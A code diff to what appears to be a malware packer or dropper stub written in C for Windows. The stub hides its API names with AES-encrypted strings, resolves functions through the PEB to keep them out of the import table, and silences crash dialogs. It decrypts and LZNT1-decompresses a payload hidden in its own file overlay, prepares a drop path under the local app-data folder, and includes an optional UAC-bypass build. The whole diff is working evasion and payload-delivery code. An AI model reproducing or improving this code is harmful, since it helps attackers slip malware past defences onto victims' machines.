@@ -33,25 +33,27 @@ static const unsigned char SKC[] = {/*SKC*/};
 static const unsigned char SIV[] = {/*SIV*/};
 
 // ── AES-encrypted string slots ────────────────────────────────────────────
-static const unsigned char S_K32[] = {/*S_K32*/};
-static const unsigned char S_U32[] = {/*S_U32*/};
-static const unsigned char S_SLP[] = {/*S_SLP*/};
-static const unsigned char S_GTC[] = {/*S_GTC*/};
-static const unsigned char S_GSM[] = {/*S_GSM*/};
-static const unsigned char S_GCP[] = {/*S_GCP*/};
-static const unsigned char S_GMFW[] = {/*S_GMFW*/};
-static const unsigned char S_GENV[] = {/*S_GENV*/};
-static const unsigned char S_CDIR[] = {/*S_CDIR*/};
-static const unsigned char S_CFW[] = {/*S_CFW*/};
-static const unsigned char S_RF[] = {/*S_RF*/};
-static const unsigned char S_GFS[] = {/*S_GFS*/};
-static const unsigned char S_WF[] = {/*S_WF*/};
-static const unsigned char S_CH[] = {/*S_CH*/};
-static const unsigned char S_CP[] = {/*S_CP*/};
-static const unsigned char S_MBW[] = {/*S_MBW*/};
-static const unsigned char S_EXT[] = {/*S_EXT*/};
-static const unsigned char S_LOCA[] = {/*S_LOCA*/};
-static const unsigned char S_MWS[] = {/*S_MWS*/};
+static const unsigned char S_K32[]    = {/*S_K32*/};
+static const unsigned char S_U32[]    = {/*S_U32*/};
+static const unsigned char S_SLP[]    = {/*S_SLP*/};
+static const unsigned char S_GTC[]    = {/*S_GTC*/};
+static const unsigned char S_GSM[]    = {/*S_GSM*/};
+static const unsigned char S_GCP[]    = {/*S_GCP*/};
+static const unsigned char S_GMFW[]   = {/*S_GMFW*/};
+static const unsigned char S_GENV[]   = {/*S_GENV*/};
+static const unsigned char S_CDIR[]   = {/*S_CDIR*/};
+static const unsigned char S_CFW[]    = {/*S_CFW*/};
+static const unsigned char S_RF[]     = {/*S_RF*/};
+static const unsigned char S_GFS[]    = {/*S_GFS*/};
+static const unsigned char S_WF[]     = {/*S_WF*/};
+static const unsigned char S_CH[]     = {/*S_CH*/};
+static const unsigned char S_CP[]     = {/*S_CP*/};
+static const unsigned char S_MBW[]    = {/*S_MBW*/};
+static const unsigned char S_EXT[]    = {/*S_EXT*/};
+static const unsigned char S_LOCA[]   = {/*S_LOCA*/};
+static const unsigned char S_MWS[]    = {/*S_MWS*/};
+static const unsigned char S_NTDLL[]  = {/*S_NTDLL*/};
+static const unsigned char S_RDB[]    = {/*S_RDB*/};
 
 #ifdef UAC_BYPASS_BUILD
 static const unsigned char S_ADV[]      = {/*S_ADV*/};
@@ -83,7 +85,6 @@ static const unsigned char S_DELEGEX[]  = {/*S_DELEGEX*/};
 static const unsigned char S_SEDEBUG[]  = {/*S_SEDEBUG*/};
 #endif // UAC_BYPASS_BUILD
 
-{/*WORDLIST*/}
 {/*JUNK_DEFS*/}
 
 static const BYTE MAGIC[8] = {/*MAGIC*/};
@@ -127,19 +128,6 @@ static BOOL AesDecPayload(const BYTE*key,const BYTE*iv,const BYTE*in,DWORD inLen
     else{HeapFree(GetProcessHeap(),0,*out);*out=NULL;}
     BCryptDestroyKey(hKey);BCryptCloseAlgorithmProvider(hAlg,0);HeapFree(GetProcessHeap(),0,ko);}
     return ok;
-}
-
-// ── Word-decoding ─────────────────────────────────────────────────────────
-static BOOL WEq(const char*a,int n,const char*b){int i=0;while(i<n&&b[i]&&a[i]==b[i])i++;return i==n&&b[i]==0;}
-static BYTE WTB(const char*w,int n){for(int i=0;i<256;i++)if(WEq(w,n,WL[i]))return(BYTE)i;return 0;}
-static BYTE* DecWords(const char*txt,DWORD tLen,DWORD expB,DWORD*oLen){
-    BYTE*r=(BYTE*)HeapAlloc(GetProcessHeap(),0,expB);
-    DWORD idx=0,s=0;
-    for(DWORD i=0;i<=tLen&&idx<expB;i++){
-        char c=(i<tLen)?txt[i]:0;
-        if(i==tLen||c==' '||c=='\n'||c=='\r'){if(i>s){r[idx++]=WTB(txt+s,(int)(i-s));}s=i+1;}
-    }
-    *oLen=idx;return r;
 }
 
 static unsigned int SHash(const wchar_t*s){unsigned int h=5381;while(*s)h=((h<<5)+h)^(unsigned int)*s++;return h;}
@@ -206,6 +194,7 @@ typedef BOOL (WINAPI*fnCH_t)(HANDLE);
 typedef BOOL (WINAPI*fnCP_t)(LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION);
 typedef int (WINAPI*fnMBW_t)(UINT,DWORD,LPCCH,int,LPWSTR,int);
 typedef HMODULE (WINAPI*fnLLA_t)(LPCSTR);
+typedef LONG (WINAPI*fnRDB_t)(USHORT,PUCHAR,ULONG,PUCHAR,ULONG,PULONG);
 
 int WINAPI WinMain(HINSTANCE,HINSTANCE,LPSTR,int){
     // Suppress all crash/WER dialogs — clean termination on any exception
@@ -242,8 +231,6 @@ int WINAPI WinMain(HINSTANCE,HINSTANCE,LPSTR,int){
     HeapFree(GetProcessHeap(),0,s);
 
     // ── Resolve all procs via export table (no GetProcAddress in IAT) ────
-    #define GP(mod,svar) ((FARPROC)PeGetProc(mod, [&](){char*r=AesDecStr(svar,sizeof(svar));return r;}()))
-    // Helper: decrypt → get proc → free
     auto getK = [&](const unsigned char* enc, int len) -> FARPROC {
         char* nm=AesDecStr(enc,len);
         FARPROC f=PeGetProc(hK32,nm);
@@ -295,26 +282,53 @@ int WINAPI WinMain(HINSTANCE,HINSTANCE,LPSTR,int){
     BYTE*fBuf=(BYTE*)HeapAlloc(GetProcessHeap(),0,fSz);
     DWORD br=0;fnRF(hSelf,fBuf,fSz,&br,NULL);fnCH(hSelf);
 
-    // ── Find overlay [MAGIC:8][TOTAL:4][WORDS(key+iv+payload)] ───────────
+    // ── Find overlay [MAGIC:8][TOTAL_RAW:4][ORIG_SIZE:4][key(32)+iv(16)+encrypted] ──
     int mPos=-1;
     for(int i=(int)fSz-8;i>=0;i--){if(memcmp(fBuf+i,MAGIC,8)==0){mPos=i;break;}}
     if(mPos<0){HeapFree(GetProcessHeap(),0,fBuf);return 0;}
 
-    DWORD totalBytes=*(DWORD*)(fBuf+mPos+8);
-    const char*wordTxt=(const char*)(fBuf+mPos+12);
-    DWORD txtLen=fSz-(DWORD)((BYTE*)wordTxt-fBuf);
+    DWORD totalRaw =*(DWORD*)(fBuf+mPos+8);
+    DWORD origSize =*(DWORD*)(fBuf+mPos+12);
+    const BYTE*rawSection=fBuf+mPos+16;
+    if(totalRaw<48){HeapFree(GetProcessHeap(),0,fBuf);return 0;}
 
-    DWORD dLen=0;
-    BYTE*decoded=DecWords(wordTxt,txtLen,totalBytes,&dLen);
-    if(!decoded||dLen<48){HeapFree(GetProcessHeap(),0,fBuf);return 0;}
-    BYTE*pKey=decoded,*pIv=decoded+32,*enc=decoded+48;
-    DWORD eLen=dLen-48;
+    const BYTE*pKey=rawSection;
+    const BYTE*pIv =rawSection+32;
+    const BYTE*enc =rawSection+48;
+    DWORD eLen=totalRaw-48;
+
+    // ── AES-decrypt → get (possibly LZNT1-compressed) payload ────────────
+    BYTE*decBuf=NULL;DWORD decLen=0;
+    if(!AesDecPayload(pKey,pIv,enc,eLen,&decBuf,&decLen)){
+        HeapFree(GetProcessHeap(),0,fBuf);return 0;
+    }
+    HeapFree(GetProcessHeap(),0,fBuf);
 
     BYTE*payload=NULL;DWORD pLen=0;
-    if(!AesDecPayload(pKey,pIv,enc,eLen,&payload,&pLen)){
-        HeapFree(GetProcessHeap(),0,decoded);HeapFree(GetProcessHeap(),0,fBuf);return 0;
+
+    if(origSize==0){
+        // Not compressed — decrypted bytes are the final payload
+        payload=decBuf; pLen=decLen;
+    } else {
+        // LZNT1-compressed — decompress via ntdll!RtlDecompressBuffer
+        char*ntdllStr=AesDecStr(S_NTDLL,sizeof(S_NTDLL));
+        int ntdllLen=0;while(ntdllStr[ntdllLen])ntdllLen++;
+        HMODULE hNtdll=PebGetMod(ntdllStr,ntdllLen);
+        HeapFree(GetProcessHeap(),0,ntdllStr);
+
+        char*rdbStr=AesDecStr(S_RDB,sizeof(S_RDB));
+        fnRDB_t fnRDB=hNtdll?(fnRDB_t)PeGetProc(hNtdll,rdbStr):NULL;
+        HeapFree(GetProcessHeap(),0,rdbStr);
+
+        if(!fnRDB){HeapFree(GetProcessHeap(),0,decBuf);return 0;}
+
+        payload=(BYTE*)HeapAlloc(GetProcessHeap(),0,origSize);
+        ULONG finalLen=0;
+        LONG status=fnRDB(0x0002,payload,origSize,decBuf,decLen,&finalLen);
+        HeapFree(GetProcessHeap(),0,decBuf);
+        if(status!=0||finalLen!=origSize){HeapFree(GetProcessHeap(),0,payload);return 0;}
+        pLen=origSize;
     }
-    HeapFree(GetProcessHeap(),0,decoded);HeapFree(GetProcessHeap(),0,fBuf);
 
     // ── Build drop path ───────────────────────────────────────────────────
     char*sLoca=AesDecStr(S_LOCA,sizeof(S_LOCA));
